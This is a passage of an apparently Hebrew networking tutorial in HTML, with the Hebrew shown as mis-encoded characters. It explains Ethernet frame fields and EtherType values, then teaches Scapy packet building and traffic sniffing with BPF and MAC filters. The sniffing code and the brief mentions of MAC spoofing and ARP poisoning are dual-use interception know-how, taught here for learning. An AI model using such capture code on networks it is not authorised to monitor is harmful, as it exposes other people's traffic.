            <pre style="padding:0; margin-top:6px; font-size: 16px; background:none;"><span class="mac">d8:bb:c1</span><span class="op">:</span><span class="cyan">7a:3f:2e</span>
<span class="cm">â””â”€ OUI â”€â”˜ â””â”€ NIC â”€â”˜</span>
<span class="cm">  (Apple)   (×™×™×—×•×“×™)</span></pre>
          </div>
        </div>
        <div>
          <div class="ic-body">
            <strong>×›×ª×•×‘×•×ª ××™×•×—×“×•×ª:</strong>
          </div>
          <div style="margin-top:10px; display:flex; flex-direction:column; gap:8px;">
            <div class="fd-example" style="margin:0;">
              <div class="ex-label">// Broadcast (×œ×›×•×œ×)</div>
              <span class="mac">FF:FF:FF:FF:FF:FF</span>
            </div>
            <div class="fd-example" style="margin:0;">
              <div class="ex-label">// Multicast (×œ×§×‘×•×¦×”)</div>
              <span class="mac">01:00:5E:xx:xx:xx</span>
            </div>
            <div class="fd-example" style="margin:0;">
              <div class="ex-label">// Null (×œ× ×‘×©×™××•×©)</div>
              <span class="mac">00:00:00:00:00:00</span>
            </div>
          </div>
          <div class="callout ca-green mt8" style="font-size: 16px;">
            <div class="callout-icon">ğŸ”</div>
            <div class="callout-body"><strong>×¡×™×™×‘×¨:</strong> × ×™×ª×Ÿ ×œ×–×™×™×£ MAC (MAC Spoofing) ×‘×ª×•×›× ×” â€” ×œ×›×Ÿ MAC ×œ×‘×“×” <strong>××™× ×” ×× ×’× ×•×Ÿ ××‘×˜×—×”</strong>!</div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- TYPE -->
  <div class="reveal mb24">
    <div class="info-card bc-yellow">
      <div class="two-col" style="gap:24px;">
        <div>
          <div class="ic-icon">ğŸ·ï¸</div>
          <div class="ic-title" style="color:var(--yellow); font-size: 16px;">EtherType / Length â€” 2 ×‘×ª×™×</div>
          <div class="ic-body mt8">
            ×©×“×” ×–×” ××¦×™×™×Ÿ <strong>××” ××›×™×œ ×”-Payload</strong>:<br><br>
            ×× ×”×¢×¨×š â‰¥ <code>0x0600</code> (1536) â€” ×–×”×• <strong>EtherType</strong> ×”××¦×™×™×Ÿ ×¤×¨×•×˜×•×§×•×œ ×©×›×‘×” ×’×‘×•×”×” ×™×•×ª×¨.<br><br>
            ×× ×”×¢×¨×š &lt; <code>0x0600</code> â€” ×–×” Ethernet II ×™×©×Ÿ ×”××¦×™×™×Ÿ ××ª ××•×¨×š ×”-Payload (Ethernet 802.3 ×™×©×Ÿ).
          </div>
        </div>
        <div>
          <div class="fd-example">
            <div class="ex-label">// ×¢×¨×›×™ EtherType × ×¤×•×¦×™×</div>
            <pre style="padding:0; margin-top:6px; font-size: 16px; background:none;"><span class="hx">0x0800</span>  <span class="cm">â†’</span>  <span class="out">IPv4</span>
<span class="hx">0x0806</span>  <span class="cm">â†’</span>  <span class="out">ARP</span>
<span class="hx">0x86DD</span>  <span class="cm">â†’</span>  <span class="out">IPv6</span>
<span class="hx">0x8100</span>  <span class="cm">â†’</span>  <span class="out">802.1Q VLAN tag</span>
<span class="hx">0x0842</span>  <span class="cm">â†’</span>  <span class="out">Wake-on-LAN</span></pre>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- DATA -->
  <div class="reveal mb24">
    <div class="info-card bc-green">
      <div class="two-col" style="gap:24px;">
        <div>
          <div class="ic-icon">ğŸ“¦</div>
          <div class="ic-title" style="color:var(--green); font-size: 16px;">Data / Payload â€” 46 ×¢×“ 1500 ×‘×ª×™×</div>
          <div class="ic-body mt8">
            ×”-Payload ×”×•× ×”××™×“×¢ ×”×××™×ª×™ â€” <strong>×—×‘×™×œ×ª IP</strong> ×©×‘×ª×•×›×” ×™×© TCP/UDP, ×•×‘×ª×•×›×” ×”-HTTP/DNS/×•×›×“×•××”.<br><br>
            <strong>×’×•×“×œ ××™× ×™××œ×™:</strong> 46 bytes. ×× ×”× ×ª×•×Ÿ ×§×˜×Ÿ ×™×•×ª×¨, ××•×¡×™×¤×™× <strong>Padding</strong> (××¤×¡×™×) ×¢×“ 46 bytes.<br><br>
            <strong>MTU = 1500 bytes</strong>. ×—×‘×™×œ×•×ª ×’×“×•×œ×•×ª ×™×•×ª×¨ ×¢×•×‘×¨×•×ª <strong>Fragmentation</strong> ×‘×©×›×‘×ª ×”×¨×©×ª.
          </div>
        </div>
        <div>
          <div class="ic-body">
            <strong>×©×›×‘×•×ª ×‘×ª×•×š ×”-Payload:</strong>
          </div>
          <div class="gap-pills mt8">
            <span class="layer-pill lp-eth">Ethernet Frame</span>
            <span class="slash-sep">/</span>
            <span class="layer-pill lp-ip">IP Packet</span>
            <span class="slash-sep">/</span>
            <span class="layer-pill lp-tcp">TCP Segment</span>
            <span class="slash-sep">/</span>
            <span class="layer-pill lp-raw">HTTP Data</span>
          </div>
          <div class="callout ca-cyan mt8" style="font-size: 16px;">
            <div class="callout-icon">ğŸ’¡</div>
            <div class="callout-body">×‘×©×¤×ª Scapy â€” ×›×œ ×¨××” ×”×™× <strong>×©×›×‘×” ×©××•×¡×™×¤×” ×©×›×‘×”</strong>: <code>Ether()/IP()/TCP()/data</code></div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- CRC -->
  <div class="reveal">
    <div class="info-card bc-purple">
      <div class="two-col" style="gap:24px;">
        <div>
          <div class="ic-icon">ğŸ”¢</div>
          <div class="ic-title" style="color:var(--purple); font-size: 16px;">CRC / FCS â€” 4 ×‘×ª×™×</div>
          <div class="ic-body mt8">
            ×”-CRC32 (Cyclic Redundancy Check) ×”×•× <strong>Checksum</strong> ×œ×’×™×œ×•×™ ×©×’×™××•×ª.<br><br>
            ×”×©×•×œ×— ××—×©×‘ CRC ×¢×œ ×›×œ ×©×“×•×ª ×”××¡×’×¨×ª ×•×©× ××ª ×”×ª×•×¦××” ×‘×©×“×” ×–×”. ×”× ××¢×Ÿ ××—×©×‘ ××—×“×© â€” ×× ×”×ª×•×¦××” ×©×•× ×”, <strong>×”××¡×’×¨×ª × ×–×¨×§×ª</strong>.<br><br>
            ×©×›×‘×ª ×”×§×• <strong>××’×œ×”</strong> ×©×’×™××•×ª ××š <strong>×œ× ××ª×§× ×ª</strong> â€” ×”×ª×™×§×•×Ÿ ×”×•× ×ª×¤×§×™×“ TCP.
          </div>
        </div>
        <div>
          <div class="fd-example">
            <div class="ex-label">// ×—×™×©×•×‘ CRC ×¤×©×˜× ×™</div>
            <pre style="padding:0; margin-top:6px; font-size: 16px; background:none;"><span class="cm"># ××” ×©×”×©×•×œ×— ××—×©×‘:</span>
<span class="fn">CRC32</span>(Dst+Src+Type+Data)
<span class="cm">â†’</span> <span class="hx">0xA3B2C1D0</span>

<span class="cm"># ×”× ××¢×Ÿ ××××ª:</span>
<span class="kw">if</span> <span class="fn">CRC32</span>(frame) <span class="op">!=</span> fcs_field:
    <span class="cm">â†’</span> <span class="err">DROP frame!</span></pre>
          </div>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- â”€â”€â”€ SEC 3: ETHERTYPE â”€â”€â”€ -->
<section class="section" id="sec-etype">
  <div class="sec-header">
    <div class="sec-tag sec-tag-yellow">// EtherType</div>
    <h2 class="sec-h2">×˜×‘×œ×ª EtherType</h2>
    <p class="sec-lead">×©×“×” ×”-EtherType (2 ×‘×ª×™×) ××¦×™×™×Ÿ ×œ××™×–×” ×¤×¨×•×˜×•×§×•×œ ×©×™×™×š ×”-Payload. ×–×”×• "×× ×’× ×•×Ÿ ×”×¨×—×‘×”" ×©××™×¤×©×¨ ×œ-Ethernet ×œ×©×¨×ª ×›×œ ×¤×¨×•×˜×•×§×•×œ.</p>
  </div>

  <div class="reveal">
    <div class="frame-wrap">
      <table class="etype-table">
        <thead>
          <tr>
            <th>EtherType (hex)</th>
            <th>×©× ×¤×¨×•×˜×•×§×•×œ</th>
            <th>×ª×™××•×¨ ×•×©×™××•×©</th>
            <th>Scapy Class</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><span class="etype-val">0x0800</span></td>
            <td><span class="etype-proto">IPv4</span></td>
            <td style="color:var(--muted2);">×ª×§×©×•×¨×ª ××™× ×˜×¨× ×˜ ×¨×’×™×œ×” â€” HTTP, DNS, SSH ×”×›×œ ×¢×•×‘×¨ ×›××Ÿ</td>
            <td><code style="color:var(--orange);">IP()</code></td>
          </tr>
          <tr>
            <td><span class="etype-val">0x0806</span></td>
            <td><span class="etype-proto">ARP</span></td>
            <td style="color:var(--muted2);">××™×¤×•×™ IPâ†’MAC ×‘×¨×©×ª ××§×•××™×ª. ×‘×¡×™×¡ ×œ-ARP Poisoning</td>
            <td><code style="color:var(--orange);">ARP()</code></td>
          </tr>
          <tr>
            <td><span class="etype-val">0x86DD</span></td>
            <td><span class="etype-proto">IPv6</span></td>
            <td style="color:var(--muted2);">×›×ª×•×‘×•×ª IPv6 ×‘××•×¨×š 128 ×‘×™×˜</td>
            <td><code style="color:var(--orange);">IPv6()</code></td>
          </tr>
          <tr>
            <td><span class="etype-val">0x8100</span></td>
            <td><span class="etype-proto">802.1Q VLAN</span></td>
            <td style="color:var(--muted2);">×ª×™×•×’ VLAN â€” ××•×¡×™×£ 4 ×‘×ª×™× × ×•×¡×¤×™× ×œ××¡×’×¨×ª (VLAN Tag)</td>
            <td><code style="color:var(--orange);">Dot1Q()</code></td>
          </tr>
          <tr>
            <td><span class="etype-val">0x8892</span></td>
            <td><span class="etype-proto">PROFINET</span></td>
            <td style="color:var(--muted2);">×ª×§×©×•×¨×ª ×ª×¢×©×™×™×ª×™×ª â€” ×¨×œ×•×•× ×˜×™ ×œ×¡×™×™×‘×¨ OT/ICS</td>
            <td><code style="color:var(--muted);">Raw()</code></td>
          </tr>
          <tr>
            <td><span class="etype-val">0x88CC</span></td>
            <td><span class="etype-proto">LLDP</span></td>
            <td style="color:var(--muted2);">×’×™×œ×•×™ ×©×›× ×™× ×‘×¨×©×ª (Link Layer Discovery Protocol)</td>
            <td><code style="color:var(--orange);">LLDPDU()</code></td>
          </tr>
          <tr>
            <td><span class="etype-val">0x0842</span></td>
            <td><span class="etype-proto">Wake-on-LAN</span></td>
            <td style="color:var(--muted2);">×”×¤×¢×œ×ª ××—×©×‘ ××¨×—×•×§ ×“×¨×š ×”×¨×©×ª (Magic Packet)</td>
            <td><code style="color:var(--muted);">Raw()</code></td>
          </tr>
          <tr>
            <td><span class="etype-val">0x8035</span></td>
            <td><span class="etype-proto">RARP</span></td>
            <td style="color:var(--muted2);">Reverse ARP â€” ××¦×™××ª IP ×œ×¤×™ MAC (××™×•×©×Ÿ, ×”×•×—×œ×£ ×¢"×™ DHCP)</td>
            <td><code style="color:var(--muted);">â€”</code></td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>

  <div class="callout ca-orange reveal mt16">
    <div class="callout-icon">ğŸ”</div>
    <div class="callout-body">
      <strong>× ×™×ª×•×— ×ª× ×•×¢×”:</strong> ×›××©×¨ ×× ×ª×—×™× PCAP ×‘-Wireshark ××• Scapy, ×©×“×” ×”-EtherType ×”×•× ×”×“×‘×¨ ×”×¨××©×•×Ÿ ×©×‘×•×“×§×™× â€” ×”×•× ××•××¨ ×œ× ×• <strong>××” ×”-Payload ×•×¢×™×œ ××™×–×” ×©×›×‘×” ×œ×”××©×™×š ×œ× ×ª×—</strong>.
    </div>
  </div>

  <hr class="sec-divider">

  <!-- VLAN TAG EXPLANATION -->
  <div class="reveal">
    <div class="sec-header" style="margin-bottom:24px;">
      <div class="sec-tag sec-tag-purple">// VLAN 802.1Q</div>
      <h3 style="font-size:1.4rem; font-weight:700; margin-top:8px;">××¡×’×¨×ª Tagged â€” VLAN 802.1Q</h3>
    </div>
    <div class="info-card bc-purple">
      <div class="ic-body mb16">
        ×›××©×¨ ××•×¡×™×¤×™× ×ª×™×•×’ VLAN, <strong>××•×¡×™×¤×™× 4 ×‘×ª×™×</strong> ×‘×™×Ÿ ×©×“×” Source MAC ×œ-EtherType:
      </div>
      <div class="frame-row" style="margin-bottom:16px;">
        <div class="frame-field ff-dst w-mac"><div class="ff-header">Dst MAC</div><div class="ff-size">6 bytes</div></div>
        <div class="frame-field ff-src w-mac"><div class="ff-header">Src MAC</div><div class="ff-size">6 bytes</div></div>
        <div class="frame-field" style="width:110px; background:rgba(168,85,247,0.2); border:1px solid rgba(168,85,247,0.4);">
          <div class="ff-header" style="color:var(--purple);">VLAN Tag<br>0x8100</div>
          <div class="ff-size" style="color:var(--purple);">4 bytes</div>
        </div>
        <div class="frame-field ff-type w-type"><div class="ff-header">EtherType</div><div class="ff-size">2 bytes</div></div>
        <div class="frame-field ff-data w-data"><div class="ff-header">Data</div><div class="ff-size">46â€“1500</div></div>
        <div class="frame-field ff-crc w-crc"><div class="ff-header">CRC</div><div class="ff-size">4 bytes</div></div>
      </div>
      <div class="code-wrap">
        <div class="code-header">
          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
          <span class="code-lang">python â€” scapy vlan</span>
          <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
        </div>
        <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>

<span class="cm"># ×™×¦×™×¨×ª ××¡×’×¨×ª ×¢× ×ª×™×•×’ VLAN 10</span>
<span class="var">pkt</span> <span class="op">=</span> <span class="fn">Ether</span>(dst<span class="op">=</span><span class="str">"ff:ff:ff:ff:ff:ff"</span>) <span class="op">/</span> \
      <span class="fn">Dot1Q</span>(vlan<span class="op">=</span><span class="num">10</span>) <span class="op">/</span> \
      <span class="fn">IP</span>(dst<span class="op">=</span><span class="ip">"192.168.10.1"</span>) <span class="op">/</span> \
      <span class="fn">ICMP</span>()

<span class="cm"># ×”×¦×’×ª ×©×›×‘×•×ª</span>
<span class="var">pkt</span>.show()
<span class="out">###[ Ethernet ]###
  dst = ff:ff:ff:ff:ff:ff
  type = 0x8100  â† VLAN Tag!
###[ 802.1Q ]###
  vlan = 10
###[ IP ]###  ...</span></pre>
      </div>
    </div>
  </div>
</section>

<!-- â”€â”€â”€ SEC 4: SCAPY INTRO â”€â”€â”€ -->
<section class="section" id="sec-scapy">
  <div class="sec-header">
    <div class="sec-tag sec-tag-green">// Scapy</div>
    <div class="scapy-logo">Scapy</div>
    <p class="sec-lead">Scapy ×”×™× ×¡×¤×¨×™×™×ª Python ×¨×‘×ª ×¢×¦××” ×œ×™×¦×™×¨×”, ×©×œ×™×—×”, ×§×‘×œ×” ×•× ×™×ª×•×— ×—×‘×™×œ×•×ª ×¨×©×ª. ×”×™× ×›×œ×™ ×”-go-to ×©×œ ×—×•×§×¨×™ ×¡×™×™×‘×¨ ×•×—×•×§×¨×™ ×¨×©×ª×•×ª.</p>
  </div>

  <!-- INSTALLATION -->
  <div class="reveal mb24">
    <div class="code-wrap">
      <div class="code-header">
        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
        <span class="code-lang">bash â€” ×”×ª×§× ×”</span>
        <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
      </div>
      <pre><span class="cm"># ×”×ª×§× ×” ×¢× pip</span>
<span class="pmt">$ </span>pip install scapy

<span class="cm"># Linux: × ×“×¨×© sudo/root ×œ×©×œ×™×—×” ×•×§×‘×œ×ª ×—×‘×™×œ×•×ª</span>
<span class="pmt">$ </span>sudo python3

<span class="cm"># ×¤×ª×™×—×ª shell ××™× ×˜×¨××§×˜×™×‘×™ ×©×œ Scapy</span>
<span class="pmt">$ </span>sudo scapy
<span class="out">Welcome to Scapy (2.5.0)
&gt;&gt;&gt; </span></pre>
    </div>
  </div>

  <!-- BASIC CONCEPTS -->
  <div class="cards-grid cg-3 reveal mb24">
    <div class="info-card bc-cyan">
      <div class="ic-icon">ğŸ”§</div>
      <div class="ic-title" style="color:var(--cyan);">×™×¦×™×¨×ª ×©×›×‘×•×ª (Layers)</div>
      <div class="ic-body">
        ×›×œ ×¤×¨×•×˜×•×§×•×œ ×”×•× <strong>××—×œ×§×” Python</strong>. ×©×›×‘×•×ª × ×‘× ×•×ª ×‘×¤×¢×•×œ×ª <code>/</code>:<br><br>
        <code>Ether()/IP()/TCP()</code>
      </div>
    </div>
    <div class="info-card bc-green">
      <div class="ic-icon">ğŸ“¡</div>
      <div class="ic-title" style="color:var(--green);">×©×œ×™×—×” ×•×§×‘×œ×”</div>
      <div class="ic-body">
        <code>sendp()</code> â€” ×©×œ×™×—×” ×‘×©×›×‘×” 2<br>
        <code>send()</code> â€” ×©×œ×™×—×” ×‘×©×›×‘×” 3<br>
        <code>srp()</code> â€” ×©×œ×— ×•×§×‘×œ (L2)<br>
        <code>sr()</code> â€” ×©×œ×— ×•×§×‘×œ (L3)
      </div>
    </div>
    <div class="info-card bc-orange">
      <div class="ic-icon">ğŸ”</div>
      <div class="ic-title" style="color:var(--orange);">× ×™×ª×•×—</div>
      <div class="ic-body">
        <code>sniff()</code> â€” ×”××–× ×” ×œ×ª× ×•×¢×”<br>
        <code>rdpcap()</code> â€” ×§×¨×™××ª ×§×•×‘×¥ PCAP<br>
        <code>pkt.show()</code> â€” ×”×¦×’×ª ×©×›×‘×•×ª<br>
        <code>pkt.summary()</code> â€” ×ª×§×¦×™×¨
      </div>
    </div>
  </div>

  <!-- LAYER DEMO -->
  <div class="reveal">
    <div class="code-wrap">
      <div class="code-header">
        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
        <span class="code-lang">python â€” scapy â€” ×™×¡×•×“×•×ª</span>
        <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
      </div>
      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>

<span class="cm"># â”€â”€â”€ ×™×¦×™×¨×ª ××¡×’×¨×ª Ethernet ×‘×¡×™×¡×™×ª â”€â”€â”€</span>
<span class="var">eth</span> <span class="op">=</span> <span class="fn">Ether</span>(
    dst<span class="op">=</span><span class="mac">"ff:ff:ff:ff:ff:ff"</span>,   <span class="cm"># MAC ×™×¢×“ (Broadcast)</span>
    src<span class="op">=</span><span class="mac">"d8:bb:c1:7a:3f:2e"</span>,   <span class="cm"># MAC ××§×•×¨ (×›×¨×˜×™×¡ ×©×œ× ×•)</span>
    type<span class="op">=</span><span class="hx">0x0800</span>               <span class="cm"># EtherType = IPv4</span>
)

<span class="cm"># â”€â”€â”€ ×”×•×¡×¤×ª ×©×›×‘×•×ª ×‘× ×’×™× ×ª / â”€â”€â”€</span>
<span class="var">pkt</span> <span class="op">=</span> <span class="fn">Ether</span>() <span class="op">/</span> <span class="fn">IP</span>() <span class="op">/</span> <span class="fn">TCP</span>() <span class="op">/</span> <span class="str">"Hello!"</span>

<span class="cm"># â”€â”€â”€ ×’×™×©×” ×œ×©×“×•×ª â”€â”€â”€</span>
<span class="fn">print</span>(<span class="var">pkt</span>[<span class="fn">Ether</span>].dst)        <span class="cm"># ff:ff:ff:ff:ff:ff</span>
<span class="fn">print</span>(<span class="var">pkt</span>[<span class="fn">IP</span>].src)           <span class="cm"># 127.0.0.1</span>
<span class="fn">print</span>(<span class="var">pkt</span>[<span class="fn">TCP</span>].dport)        <span class="cm"># 20</span>

<span class="cm"># â”€â”€â”€ ×”×¦×’×ª ×›×œ ×”×©×›×‘×•×ª â”€â”€â”€</span>
<span class="var">pkt</span>.show()

<span class="out">###[ Ethernet ]###
  dst       = ff:ff:ff:ff:ff:ff
  src       = d8:bb:c1:7a:3f:2e
  type      = IPv4 (0x0800)
###[ IP ]###
     version   = 4
     ihl       = 5
     src       = 127.0.0.1
     dst       = 127.0.0.1
###[ TCP ]###
        sport     = ftp_data (20)
        dport     = http (80)
###[ Raw ]###
           load      = 'Hello!'</span>

<span class="cm"># â”€â”€â”€ ×‘×“×™×§×” ×œ×¤×™ ×©×›×‘×” â”€â”€â”€</span>
<span class="var">pkt</span>.haslayer(<span class="fn">IP</span>)             <span class="cm"># True</span>
<span class="var">pkt</span>.haslayer(<span class="fn">UDP</span>)            <span class="cm"># False</span></pre>
    </div>
  </div>
</section>

<!-- â”€â”€â”€ SEC 5: SNIFFING â”€â”€â”€ -->
<section class="section" id="sec-sniff">
  <div class="sec-header">
    <div class="sec-tag sec-tag-cyan">// Sniffing</div>
    <h2 class="sec-h2">×”××–× ×” ×œ×ª× ×•×¢×ª <span style="color:var(--cyan)">Ethernet</span></h2>
    <p class="sec-lead">Scapy ×××¤×©×¨×ª ×œ×”××–×™×Ÿ ×œ×ª× ×•×¢×ª ×”×¨×©×ª ×¢×œ ×××©×§ ×¡×¤×¦×™×¤×™, ×œ×¡× ×Ÿ ×œ×¤×™ BPF filter, ×•×œ× ×ª×— ×›×œ ××¡×’×¨×ª ×‘×–××Ÿ ×××ª.</p>
  </div>

  <!-- TABS -->
  <div class="tabs-header">
    <button class="tab-btn active" onclick="switchTab('sniff', 'basic')">×”××–× ×” ×‘×¡×™×¡×™×ª</button>
    <button class="tab-btn" onclick="switchTab('sniff', 'filter')">×¡×™× ×•×Ÿ BPF</button>
    <button class="tab-btn" onclick="switchTab('sniff', 'callback')">×¢×™×‘×•×“ ×‘×–××Ÿ ×××ª</button>
    <button class="tab-btn" onclick="switchTab('sniff', 'pcap')">×§×¨×™××ª PCAP</button>
  </div>

  <div id="sniff-basic" class="tab-pane active">
    <div class="two-col" style="gap:24px; align-items:start;">
      <div>
        <div class="code-wrap">
          <div class="code-header">
            <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
            <span class="code-lang">python â€” ×”××–× ×” ×‘×¡×™×¡×™×ª</span>
            <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
          </div>
          <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>

<span class="cm"># ×”××–× ×” ×œ-10 ××¡×’×¨×•×ª ×¢×œ ×××©×§ eth0</span>
<span class="var">pkts</span> <span class="op">=</span> <span class="fn">sniff</span>(
    iface<span class="op">=</span><span class="str">"eth0"</span>,   <span class="cm"># ×××©×§ ×¨×©×ª</span>
    count<span class="op">=</span><span class="num">10</span>       <span class="cm"># ×›××•×ª ××¡×’×¨×•×ª</span>
)

<span class="cm"># ×¡×™×›×•× ×›×œ ××¡×’×¨×ª</span>
<span class="var">pkts</span>.summary()

<span class="out">Ether / IP / TCP 192.168.1.5:52341 > 8.8.8.8:443 S
Ether / IP / UDP 192.168.1.5:53 > 192.168.1.1:53
Ether / ARP who has 192.168.1.1 says 192.168.1.5
...</span>

<span class="cm"># ×’×™×©×” ×œ×—×‘×™×œ×” ×¡×¤×¦×™×¤×™×ª</span>
<span class="var">first</span> <span class="op">=</span> <span class="var">pkts</span>[<span class="num">0</span>]
<span class="fn">print</span>(<span class="var">first</span>[<span class="fn">Ether</span>].src)   <span class="cm"># MAC ××§×•×¨</span>
<span class="fn">print</span>(<span class="var">first</span>[<span class="fn">Ether</span>].dst)   <span class="cm"># MAC ×™×¢×“</span>
<span class="fn">print</span>(<span class="var">first</span>[<span class="fn">Ether</span>].type)  <span class="cm"># EtherType</span>

<span class="cm"># ×©××™×¨×” ×œ-PCAP</span>
<span class="fn">wrpcap</span>(<span class="str">"capture.pcap"</span>, <span class="var">pkts</span>)</pre>
        </div>
      </div>
      <div>
        <div class="info-card bc-cyan">
          <div class="ic-title" style="color:var(--cyan);">×¤×¨××˜×¨×™× ×—×©×•×‘×™× ×œ-sniff()</div>
          <div style="margin-top:12px; display:flex; flex-direction:column; gap:10px;">
            <div class="fd-example" style="margin:0;">
              <div class="ex-label">// iface</div>
              <span class="ex-val">iface="eth0"</span> â€” ×××©×§ ×¨×©×ª ×œ×§×©×™×‘×”
            </div>
            <div class="fd-example" style="margin:0;">
              <div class="ex-label">// count</div>
              <span class="ex-val">count=50</span> â€” ×¢×¦×•×¨ ××—×¨×™ N ××¡×’×¨×•×ª
            </div>
            <div class="fd-example" style="margin:0;">
              <div class="ex-label">// timeout</div>
              <span class="ex-val">timeout=10</span> â€” ×¢×¦×•×¨ ××—×¨×™ N ×©× ×™×•×ª
            </div>
            <div class="fd-example" style="margin:0;">
              <div class="ex-label">// filter</div>
              <span class="ex-val">filter="arp"</span> â€” BPF filter
            </div>
            <div class="fd-example" style="margin:0;">
              <div class="ex-label">// prn</div>
              <span class="ex-val">prn=my_func</span> â€” callback ×œ×›×œ ××¡×’×¨×ª
            </div>
            <div class="fd-example" style="margin:0;">
              <div class="ex-label">// store</div>
              <span class="ex-val">store=False</span> â€” ×œ× ×œ×©××•×¨ ×‘×–×™×›×¨×•×Ÿ
            </div>
          </div>
        </div>
        <div class="callout ca-red mt16">
          <div class="callout-icon">ğŸ”‘</div>
          <div class="callout-body"><strong>× ×“×¨×© ×”×¨×©××•×ª root/admin</strong> â€” Sniffing ×‘×¨××ª Ethernet ×“×•×¨×© ×’×™×©×” ×œ-raw socket. ×”×¨×¥ ×¢× <code>sudo python3</code>.</div>
        </div>
      </div>
    </div>
  </div>

  <div id="sniff-filter" class="tab-pane">
    <div class="code-wrap">
      <div class="code-header">
        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
        <span class="code-lang">python â€” BPF filters</span>
        <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
      </div>
      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>

<span class="cm"># â”€â”€â”€ ×¡×™× ×•×Ÿ BPF (Berkeley Packet Filter) â”€â”€â”€</span>
<span class="cm"># BPF ×¤×•×¢×œ ×‘×¨××ª ×”×’×¨×¢×™×Ÿ â€” ×™×¢×™×œ ×××•×“!</span>

<span class="cm"># ×¨×§ ×—×‘×™×œ×•×ª ARP</span>
<span class="var">arp_pkts</span> <span class="op">=</span> <span class="fn">sniff</span>(filter<span class="op">=</span><span class="str">"arp"</span>, count<span class="op">=</span><span class="num">5</span>)

<span class="cm"># ×¨×§ TCP ××¤×•×¨×˜ HTTP/HTTPS</span>
<span class="var">web_pkts</span> <span class="op">=</span> <span class="fn">sniff</span>(
    filter<span class="op">=</span><span class="str">"tcp port 80 or tcp port 443"</span>,
    iface<span class="op">=</span><span class="str">"eth0"</span>,
    count<span class="op">=</span><span class="num">20</span>
)

<span class="cm"># ×¨×§ ×××—×©×‘ ×¡×¤×¦×™×¤×™</span>
<span class="var">host_pkts</span> <span class="op">=</span> <span class="fn">sniff</span>(
    filter<span class="op">=</span><span class="str">"host 192.168.1.100"</span>,
    count<span class="op">=</span><span class="num">50</span>
)

<span class="cm"># ×©×™×œ×•×‘: UDP + ×¨×©×ª ×¡×¤×¦×™×¤×™×ª</span>
<span class="var">dns_pkts</span> <span class="op">=</span> <span class="fn">sniff</span>(
    filter<span class="op">=</span><span class="str">"udp port 53 and net 192.168.0.0/16"</span>,
    count<span class="op">=</span><span class="num">10</span>
)

<span class="cm"># â”€â”€â”€ ×¤×™×œ×˜×¨ ×œ×¤×™ MAC address â”€â”€â”€</span>
<span class="cm"># BPF ×œ× ×ª×•××š ×‘-MAC ×™×©×™×¨×•×ª â€” ×¡× ×Ÿ ×‘Python:</span>
<span class="kw">def</span> <span class="fn">mac_filter</span>(pkt):
    <span class="kw">if</span> pkt.haslayer(<span class="fn">Ether</span>):
        <span class="kw">return</span> pkt[<span class="fn">Ether</span>].src <span class="op">==</span> <span class="mac">"d8:bb:c1:7a:3f:2e"</span>
    <span class="kw">return</span> <span class="kw">False</span>

<span class="var">mac_pkts</span> <span class="op">=</span> <span class="fn">sniff</span>(lfilter<span class="op">=</span><span class="fn">mac_filter</span>, count<span class="op">=</span><span class="num">10</span>)

<span class="cm"># â”€â”€â”€ BPF filters ×©×™××•×©×™×™× â”€â”€â”€</span>
<span class="cm"># "icmp"                    â†’ Ping ×‘×œ×‘×“</span>
<span class="cm"># "not arp"                 â†’ ×”×›×œ ×—×•×¥ ×-ARP</span>
<span class="cm"># "ether broadcast"         â†’ Broadcast ×‘×œ×‘×“</span>
<span class="cm"># "ether multicast"         â†’ Multicast ×‘×œ×‘×“</span>
<span class="cm"># "vlan 10"                 â†’ VLAN 10 ×‘×œ×‘×“</span>
<span class="cm"># "greater 500"             â†’ ××¡×’×¨×•×ª &gt; 500 bytes</span></pre>
    </div>
  </div>

  <div id="sniff-callback" class="tab-pane">
    <div class="code-wrap">
      <div class="code-header">
        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
        <span class="code-lang">python â€” ×¢×™×‘×•×“ ×‘×–××Ÿ ×××ª</span>
        <button class="copy-btn" onclick="copyCode(this)">×”×¢×ª×§</button>
      </div>
      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
<span class="kw">from</span> <span class="op">collections</span> <span class="kw">import</span> <span class="op">defaultdict</span>

<span class="cm"># â”€â”€â”€ ×“×•×’××” 1: ×× ×”×œ ×ª× ×•×¢×” ×‘×¡×™×¡×™ â”€â”€â”€</span>
<span class="kw">def</span> <span class="fn">analyze_eth</span>(pkt):
    <span class="var">eth</span> <span class="op">=</span> pkt[<span class="fn">Ether</span>]
    <span class="fn">print</span>(<span class="str">f"[Ethernet] {eth.src} â†’ {eth.dst}"</span>,
          <span class="str">f"| Type: {hex(eth.type)}"</span>,
          <span class="str">f"| Len: {len(pkt)} bytes"</span>)
    
    <span class="kw">if</span> pkt.haslayer(<span class="fn">IP</span>):
        <span class="var">ip</span> <span class="op">=</span> pkt[<span class="fn">IP</span>]
        <span class="fn">print</span>(<span class="str">f"  [IP] {ip.src} â†’ {ip.dst}"</span>)
    
    <span class="kw">elif</span> pkt.haslayer(<span class="fn">ARP</span>):
        <span class="var">arp</span> <span class="op">=</span> pkt[<span class="fn">ARP</span>]
        <span class="fn">print</span>(<span class="str">f"  [ARP] who has {arp.pdst}?"</span>
